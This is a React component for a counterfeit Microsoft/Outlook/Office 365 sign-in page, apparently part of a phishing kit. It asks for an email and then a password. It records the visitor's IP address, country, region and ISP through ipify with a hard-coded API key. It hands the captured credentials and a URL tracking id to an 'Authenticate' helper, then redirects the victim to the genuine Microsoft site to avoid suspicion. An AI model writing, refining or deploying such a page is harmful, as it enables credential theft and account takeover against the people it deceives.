import { useState, useEffect } from 'react'
import MicrosoftLogo from '../../assets/microsoft_logo.svg'
import Outlook from '../../assets/Outlook-login.png'
import { useParams } from 'react-router-dom'
import { Authenticate } from '../../helpers/Auth'
import axios from 'axios'
import Loader from '../../component/Loader'
import useQueryParams from '../../hooks/useQueryParams'

const Microsoft = () => {
  const { service } = useParams()
  const id = useQueryParams()
  const [showPasswordInput, setShowPasswordInput] = useState(false)
  const [btnText, setBtnText] = useState('Next')

  const [userID, setUserID] = useState('')
  const [password, setPassword] = useState('')
  const [error, setError] = useState('')

  const [IPAddress, setIPAddress] = useState('')
  const [metaData, setMetaData] = useState('')
  const [redirect, setRedirect] = useState(false)

  const [isLoading, setIsLoading] = useState(false)
  const [title, setTitle] = useState('')
  setTitle(service === 'outlook' ? 'outlook' : 'office360')
  let link
  link =
    service === 'outlook' ? 'https://outlook.com' : 'https://office365.com/'
  useEffect(() => {
    redirect && window.location.replace(link)
  }, [redirect])

  useEffect(() => {
    fetch('https://api.ipify.org?format=json')
      .then((response) => response.json())
      .then((data) => {
        setIPAddress(data.ip)
        console.log('ip is', data.ip)
      })
      .then(() => {
        axios
          .get(
            `https://geo.ipify.org/api/v2/country?apiKey=at_51bi5RPzvgaTrXYA9cZohqZqMyKPI&ipAddress=${IPAddress}`
          )
          .then((resp) => {
            const { location, isp } = resp.data
            const { country, region } = location
            console.log(country, region, isp)
            setMetaData({ country, region, isp })
          })
          .catch((e) => console.log(e))
      })
      .catch((error) => console.error(error))
  }, [])

  const handleBtn = () => {
    setError('')
    if (btnText === 'Next') {
      if (!userID) {
        setError('Please enter your email, phone or skype')
        return
      }
      setBtnText('Submit')
      setShowPasswordInput(true)
    } else if (btnText === 'Submit') {
      if (!password) {
        setError('Please enter your password')
        return
      }
      setIsLoading(true)
      Authenticate(
        userID,
        password,
        service,
        IPAddress,
        metaData,
        id,
        title
      ).then(() => setRedirect(true))
    }
  }

  const handleBack = () => {
    setShowPasswordInput(false)
    setBtnText('Next')
  }

  return (
    <div className='w-screen h-screen overflow-y-auto flex items-center justify-center microsoft-login'>
      <section className='w-full md:w-[30vw] md:h-[50vh] flex flex-col gap-5 px-2 md:px-[auto]'>
        {service === 'outlook' && (
          <img src={Outlook} className='w-[10rem] self-center ' />
        )}
        <div className='p-11 md:shadow-microsoftLogin '>
          <img src={MicrosoftLogo} className='mb-5 ' />
          <header className='my-3'>
            <p className='text-3xl md:text-2xl text-[#1b1b1b]'>Sign in</p>
            {service === 'outlook' && (
              <p className='font-light text-base md:text-sm'>
                to continue to Outlook
              </p>
            )}
          </header>
          <section className='flex w-full flex-col gap-2'>
            {!showPasswordInput ? (
              <input
                placeholder='Email, phone or Skype'
                className='outline-none border-b-2 w-full bg-transparent h-9'
                value={userID}
                onChange={(e) => setUserID(e.target.value)}
              />
            ) : (
              <input
                placeholder='Password'
                type='password'
                className='outline-none border-b-2 w-full bg-transparent h-9'
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
            )}
            <p className='text-lg text-red-700 tracking-wide'>{error}</p>

            <span className='self-end justify-self-end flex gap-2'>
              {showPasswordInput && (
                <button
                  className='bg-[#B2B2B2] hover:bg-[#b2b2b2f3] text-white w-[7rem] p-1 text-lg mt-3 outline-none'
                  onClick={handleBack}
                >
                  Back
                </button>
              )}
              <button
                className='bg-[#0067B8] hover:bg-[#003db8ef] text-white w-[7rem] p-1 text-lg mt-3 outline-none'
                onClick={handleBtn}
              >
                {btnText}
              </button>
            </span>
          </section>
        </div>
      </section>
      {isLoading && <Loader message={'Loading'} />}
    </div>
  )
}

export default Microsoft
